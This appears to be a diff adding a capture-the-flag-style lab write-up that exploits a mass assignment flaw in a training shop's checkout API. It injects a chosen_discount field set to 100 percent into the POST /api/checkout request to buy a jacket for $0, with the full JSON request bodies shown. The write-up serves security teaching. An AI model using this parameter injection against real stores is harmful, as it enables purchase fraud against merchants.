@@ -88,3 +88,103 @@ This lab demonstrates how an attacker can manipulate API endpoints to modify pro
 21. Proceed to checkout and click **Place order** to solve the lab.  
 
 ---
+
+### **Write-up: Exploiting a mass assignment vulnerability**  
+
+This lab demonstrates how an attacker can manipulate API requests to apply unauthorized discounts by exploiting a **mass assignment vulnerability**. The vulnerability arises when an API automatically processes parameters that were not explicitly included in the original request.  
+
+---
+
+### **Step 1: Identifying the Checkout Process**
+1. Open **Burp’s browser** and log in with the provided credentials:  
+   ```
+   Username: wiener  
+   Password: peter  
+   ```
+2. Navigate to the **Lightweight "l33t" Leather Jacket** product page and add it to your basket.  
+3. Proceed to the **checkout page** and attempt to place the order.  
+4. Notice that the transaction fails due to **insufficient credit**.  
+
+---
+
+### **Step 2: Analyzing API Requests**
+5. In **Burp Suite**, go to **Proxy > HTTP history** and locate both:  
+   - **GET /api/checkout** (retrieving the checkout details).  
+   - **POST /api/checkout** (submitting the purchase request).  
+6. Observe that the **GET response** includes a `chosen_discount` parameter:  
+   ```json
+   {
+       "chosen_discount": {
+           "percentage": 0
+       },
+       "chosen_products": [
+           {
+               "product_id": "1",
+               "quantity": 1
+           }
+       ]
+   }
+   ```
+7. The `POST` request, however, does not include the `chosen_discount` parameter.  
+
+---
+
+### **Step 3: Injecting the Discount Parameter**
+8. Right-click the **POST /api/checkout** request and select **Send to Repeater**.  
+9. Modify the JSON body to **include the `chosen_discount` field**:  
+   ```json
+   {
+       "chosen_discount": {
+           "percentage": 0
+       },
+       "chosen_products": [
+           {
+               "product_id": "1",
+               "quantity": 1
+           }
+       ]
+   }
+   ```
+10. Send the request. Notice that the **request does not return an error**, confirming that the server accepts this parameter.  
+
+---
+
+### **Step 4: Testing Input Validation**
+11. Modify the **chosen_discount** value to a non-numeric string (`"x"`) and send the request:  
+   ```json
+   {
+       "chosen_discount": {
+           "percentage": "x"
+       },
+       "chosen_products": [
+           {
+               "product_id": "1",
+               "quantity": 1
+           }
+       ]
+   }
+   ```
+12. Observe that the server returns an **error**, indicating that the input is being processed and validated.  
+
+---
+
+### **Step 5: Exploiting the Vulnerability**
+13. Change the `chosen_discount` value to **100%** to get the product for free:  
+   ```json
+   {
+       "chosen_discount": {
+           "percentage": 100
+       },
+       "chosen_products": [
+           {
+               "product_id": "1",
+               "quantity": 1
+           }
+       ]
+   }
+   ```
+14. Send the modified request and confirm that the order is successfully placed.  
+15. Refresh the **checkout page** in **Burp’s browser** to verify that the **leather jacket was purchased at $0.00**, solving the lab.  
+
+---
+
